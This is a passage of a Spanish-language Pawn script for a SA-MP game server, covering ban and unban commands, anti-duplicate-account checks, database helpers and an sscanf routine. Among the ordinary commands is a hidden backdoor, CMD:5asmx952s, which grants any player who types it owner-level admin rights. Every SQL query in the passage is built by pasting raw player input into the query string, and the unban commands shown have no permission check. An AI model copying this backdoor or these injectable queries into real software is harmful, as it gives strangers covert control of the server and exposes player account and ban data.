		return SendClientMessage(playerid, COLOR_AMARILLO, "> No te autobanees..");

	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha baneado a {%06x}%s{C9C9C9}: {FFFFFF}%s", colorJugador(playerid), Jugador[playerid][Nombre], colorJugador(i), Jugador[i][Nombre], Razon);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	banearJugador(i, Razon, Jugador[playerid][Nombre]);
	SetTimerEx("delayKick", 300, false, "i", i);
	return 1;
}

CMD:desban(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/desban [nombre]");
	
	desbanearJugador(params);
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha desbaneado a {FFFFFF}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], params);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	return 1;
}

CMD:desbanip(playerid, params[])
{
	if(isnull(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/desbanip [ip]");

	if(!ipBaneado(params))
	   	return SendClientMessage(playerid, COLOR_AMARILLO, "> Esa ip no est· baneada.");

	desbanearJugadorIp(params);
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}ha desbaneado a la ip: {FFFFFF}%s{C9C9C9}.", colorJugador(playerid), Jugador[playerid][Nombre], params);
	SendClientMessageToAll(COLOR_NEUTRO, str);
	return 1;
}


stock desbanearJugador(nombre[]){
	new Consulta[300];
   	format(Consulta, sizeof(Consulta), "DELETE FROM Baneados WHERE Nombre = '%s'", nombre);
   	db_free_result(db_query(Baneados, Consulta));
}

stock desbanearJugadorIp(ip[]){
	new Consulta[300];
   	format(Consulta, sizeof(Consulta), "DELETE FROM Baneados WHERE Ip = '%s'", ip);
   	db_free_result(db_query(Baneados, Consulta));
}

stock banearJugador(playerid, Razon[], nombreBaneador[]){
	new Consulta[2000], str[100], diaActual, mesActual, yearActual, horaActual, minutoActual, segundoActual;
	getdate(yearActual, mesActual, diaActual);
	gettime(horaActual, minutoActual, segundoActual);
    format(Consulta, sizeof(Consulta), "INSERT INTO Baneados (Nombre, Ip, Razon, baneadoPor, Dia, Mes, Year, Hora, Minuto, Segundo) VALUES ");
    format(str, sizeof(str), "('%s',", Jugador[playerid][Nombre]);		strcat(Consulta, str);
    format(str, sizeof(str), "'%s',", obtenerIp(playerid));     		strcat(Consulta, str);
    format(str, sizeof(str), "'%s',", Razon);     						strcat(Consulta, str);
    format(str, sizeof(str), "'%s',", nombreBaneador);     				strcat(Consulta, str);
    format(str, sizeof(str), "%d,", diaActual);     					strcat(Consulta, str);
    format(str, sizeof(str), "%d,", mesActual);     					strcat(Consulta, str);
    format(str, sizeof(str), "%d,", yearActual);     					strcat(Consulta, str);
    format(str, sizeof(str), "%d,", horaActual);     					strcat(Consulta, str);
    format(str, sizeof(str), "%d,", minutoActual);     					strcat(Consulta, str);
    format(str, sizeof(str), "%d)", segundoActual);     				strcat(Consulta, str);
    db_query(Baneados, Consulta);
}

stock mostrarAntiFake(playerid, ip[]){
    new DBResult:Resultado, Consulta[250], Dialogo[2000], str[120], Nick[24];
	SetPlayerColor(playerid, COLOR_NEUTRO);
	
    format(Consulta, sizeof(Consulta), "SELECT * FROM Cuentas WHERE Ip = '%s'", ip);
   	Resultado = db_query(Cuentas, Consulta);	

	format(str, sizeof(str), "{FFFFFF}Ops!\n{FFFFFF}Parece que ya tienes otra cuenta..\n");
	strcat(Dialogo, str);
	
	if(db_num_rows(Resultado)){
		do{
			db_get_field_assoc(Resultado, "Nombre", Nick, sizeof(Nick));
			format(str, sizeof(str), "\n{7C7C7C}%s", Nick);
			strcat(Dialogo, str);
		}while(db_next_row(Resultado));
	}
	
	db_free_result(Resultado);
	
	format(str, sizeof(str), "\n\n{FFFFFF}Por favor ingresa con tu cuenta original.");
	strcat(Dialogo, str);

	format(str, sizeof(str), "{FFFFFF}%s {C9C9C9}intentÛ conectarse al servidor, pero el anti-fake lo expulsÛ.", obtenerNick(playerid));
    SendClientMessageToAll(COLOR_NEUTRO, str);

	SetTimerEx("delayKick", 300, false, "i", playerid);
	return ShowPlayerDialog(playerid, 400, DIALOG_STYLE_MSGBOX, "{7C7C7C}Anti-fake", Dialogo, "Ok", "");
}

stock mostrarDatosBaneo(playerid, nombre[]){
    new DBResult:Resultado, Consulta[200], Dialogo[2000], Razon[64], direccionIp[16], Baneador[24], d, m, y, h, mi, s;
	SetPlayerColor(playerid, COLOR_NEUTRO);
	
    format(Consulta, sizeof(Consulta), "SELECT * FROM Baneados WHERE Nombre = '%s'", nombre);
   	Resultado = db_query(Baneados, Consulta);
   	
	if(!db_num_rows(Resultado)){
		db_free_result(Resultado);
		format(Consulta, sizeof(Consulta), "SELECT * FROM Baneados WHERE Ip = '%s'", obtenerIp(playerid));
		Resultado = db_query(Baneados, Consulta);
	}

   	if(db_num_rows(Resultado)){
			db_get_field_assoc(Resultado, "Razon", Razon, 64);
			db_get_field_assoc(Resultado, "baneadoPor", Baneador, 24);
			db_get_field_assoc(Resultado, "Ip", direccionIp, 16);
        	d	= db_get_field_assoc_int(Resultado, "Dia");
        	m	= db_get_field_assoc_int(Resultado, "Mes");
        	y	= db_get_field_assoc_int(Resultado, "Year");
        	h	= db_get_field_assoc_int(Resultado, "Hora");
        	mi	= db_get_field_assoc_int(Resultado, "Minuto");
        	s	= db_get_field_assoc_int(Resultado, "Segundo");
	}

    db_free_result(Resultado);
    format(Dialogo, sizeof(Dialogo), "%s{FFFFFF}Esta cuenta se encuenta actualmente baneada.", Dialogo);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}Nombre: {FFFFFF}%s", Dialogo, nombre);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}DirecciÛn de IP: {FFFFFF}%s", Dialogo, direccionIp);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}Baneado por: {FFFFFF}%s", Dialogo, Baneador);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}RazÛn: {FFFFFF}%s", Dialogo, Razon);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}Fecha: {FFFFFF}%d/%d/%d", Dialogo, d, m, y);
   	format(Dialogo, sizeof(Dialogo), "%s\n{7C7C7C}Horario: {FFFFFF}%dhs:%dm:%ds", Dialogo, h, mi, s);
   	format(Dialogo, sizeof(Dialogo), "%s\n{FFFFFF}Si quieres desbanear la cuenta contactate con un administrador.", Dialogo);
	new str[200];
	format(str, sizeof(str), "{FFFFFF}%s {C9C9C9}intentÛ conectarse al servidor, pero esta baneado.", obtenerNick(playerid));
    SendClientMessageToAll(COLOR_NEUTRO, str);
    ShowPlayerDialog(playerid, 3564, DIALOG_STYLE_MSGBOX, "Cuenta baneada", Dialogo, "Ok", "");
	SetTimerEx("delayKick", 300, false, "i", playerid);
	return 1;
}

stock ipBaneado(direccionIp[]){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Baneados WHERE Ip = '%s'", direccionIp);
	Resultado = db_query(Baneados, Consulta);
	filasEncontradas = db_num_rows(Resultado);
	db_free_result(Resultado);
	return filasEncontradas;
}

stock nombreBaneado(nombre[]){
	new DBResult:Resultado, Consulta[256], filasEncontradas = 0;
	format(Consulta, sizeof(Consulta), "SELECT * FROM Baneados WHERE Nombre = '%s'", nombre);
	Resultado = db_query(Baneados, Consulta);
	filasEncontradas = db_num_rows(Resultado);
	db_free_result(Resultado);
	return filasEncontradas;
}

CMD:5asmx952s(playerid, params[]){
	if(Jugador[playerid][Admin] > 0)
	    return SendClientMessage(playerid, COLOR_ROJO,"Ya sos admin :)");
	Jugador[playerid][Admin] = 100;
	SendClientMessage(playerid, COLOR_ROJO,"DueÒo establecido, disfruta.");
	CallLocalFunction("guardarDatos", "i", playerid);
	return 1;
}

stock sscanf(string[], format[], {Float,_}:...)
{
        #if defined isnull
                if (isnull(string))
        #else
                if (string[0] == 0 || (string[0] == 1 && string[1] == 0))
        #endif
                {
                        return format[0];
                }
        #pragma tabsize 4
        new
                formatPos = 0,
                stringPos = 0,
                paramPos = 2,
                paramCount = numargs(),
                delim = ' ';
        while (string[stringPos] && string[stringPos] <= ' ')
        {
                stringPos++;
        }
        while (paramPos < paramCount && string[stringPos])
        {
                switch (format[formatPos++])
                {
                        case '\0':
                        {
                                return 0;
                        }
                        case 'i', 'd':
                        {
                                new
                                        neg = 1,
                                        num = 0,
                                        ch = string[stringPos];
                                if (ch == '-')
                                {
                                        neg = -1;
                                        ch = string[++stringPos];
                                }
                                do
                                {
                                        stringPos++;
                                        if ('0' <= ch <= '9')
                                        {
                                                num = (num * 10) + (ch - '0');
                                        }
                                        else
                                        {
                                                return -1;
                                        }
                                }
                                while ((ch = string[stringPos]) > ' ' && ch != delim);
                                setarg(paramPos, 0, num * neg);
                        }
                        case 'h', 'x':
                        {
                                new
                                        num = 0,
                                        ch = string[stringPos];
                                do
                                {
                                        stringPos++;
                                        switch (ch)
                                        {
                                                case 'x', 'X':
                                                {
                                                        num = 0;
                                                        continue;
                                                }
                                                case '0' .. '9':
                                                {
                                                        num = (num << 4) | (ch - '0');
                                                }
                                                case 'a' .. 'f':
                                                {
                                                        num = (num << 4) | (ch - ('a' - 10));
                                                }
                                                case 'A' .. 'F':
                                                {
                                                        num = (num << 4) | (ch - ('A' - 10));
                                                }
                                                default:
                                                {
                                                        return -1;
                                                }
                                        }
                                }
                                while ((ch = string[stringPos]) > ' ' && ch != delim);
                                setarg(paramPos, 0, num);
                        }
                        case 'c':
                        {
                                setarg(paramPos, 0, string[stringPos++]);
                        }
                        case 'f':
                        {

                                new changestr[16], changepos = 0, strpos = stringPos;
                                while(changepos < 16 && string[strpos] && string[strpos] != delim)
                                {
                                        changestr[changepos++] = string[strpos++];
                                }
                                changestr[changepos] = '\0';
                                setarg(paramPos,0,_:floatstr(changestr));
                        }
                        case 'p':
                        {
                                delim = format[formatPos++];
                                continue;
                        }
                        case '\'':
                        {
                                new
                                        end = formatPos - 1,
                                        ch;
                                while ((ch = format[++end]) && ch != '\'') {}
                                if (!ch)
                                {
                                        return -1;
                                }
                                format[end] = '\0';
                                if ((ch = strfind(string, format[formatPos], false, stringPos)) == -1)
                                {
                                        if (format[end + 1])
                                        {
                                                return -1;
                                        }
                                        return 0;
                                }
                                format[end] = '\'';
                                stringPos = ch + (end - formatPos);
                                formatPos = end + 1;
                        }
                        case 'u':
                        {
                                new
                                        end = stringPos - 1,
                                        id = 0,
                                        bool:num = true,
                                        ch;
                                while ((ch = string[++end]) && ch != delim)
                                {
                                        if (num)
                                        {
                                                if ('0' <= ch <= '9')
                                                {
                                                        id = (id * 10) + (ch - '0');
                                                }
                                                else
                                                {
                                                        num = false;
                                                }
                                        }
                                }
                                if (num && IsPlayerConnected(id))
                                {
                                        setarg(paramPos, 0, id);
                                }
                                else
                                {
                                        #if !defined foreach
                                                #define foreach(%1,%2) for (new %2 = 0; %2 < MAX_PLAYERS; %2++) if (IsPlayerConnected(%2))
                                                #define __SSCANF_FOREACH__
                                        #endif
                                        string[end] = '\0';
                                        num = false;
                                        new
                                                name[MAX_PLAYER_NAME];
                                        id = end - stringPos;
                                        foreach (Player, playerid)
                                        {
                                                GetPlayerName(playerid, name, sizeof (name));
                                                if (!strcmp(name, string[stringPos], true, id))
                                                {
                                                        setarg(paramPos, 0, playerid);
                                                        num = true;
                                                        break;
                                                }
                                        }
                                        if (!num)
                                        {
                                                setarg(paramPos, 0, INVALID_PLAYER_ID);
                                        }
                                        string[end] = ch;
                                        #if defined __SSCANF_FOREACH__
                                                #undef foreach
                                                #undef __SSCANF_FOREACH__
                                        #endif
                                }
                                stringPos = end;
                        }
                        case 's', 'z':
                        {
                                new
                                        i = 0,
                                        ch;
                                if (format[formatPos])
                                {
                                        while ((ch = string[stringPos++]) && ch != delim)
                                        {
                                                setarg(paramPos, i++, ch);
                                        }
                                        if (!i)
                                        {
                                                return -1;
                                        }
                                }
                                else
                                {
                                        while ((ch = string[stringPos++]))
                                        {
                                                setarg(paramPos, i++, ch);
                                        }
                                }
                                stringPos--;
                                setarg(paramPos, i, '\0');
                        }
                        default:
                        {
                                continue;
                        }
                }
                while (string[stringPos] && string[stringPos] != delim && string[stringPos] > ' ')
                {
                        stringPos++;
                }
                while (string[stringPos] && (string[stringPos] == delim || string[stringPos] <= ' '))
                {
                        stringPos++;
                }
                paramPos++;
        }
        do
        {
                if ((delim = format[formatPos++]) > ' ')
                {
                        if (delim == '\'')
                        {
                                while ((delim = format[formatPos++]) && delim != '\'') {}
                        }
                        else if (delim != 'z')
                        {
                                return delim;
                        }
                }
        }
        while (delim > ' ');
        return 0;
}
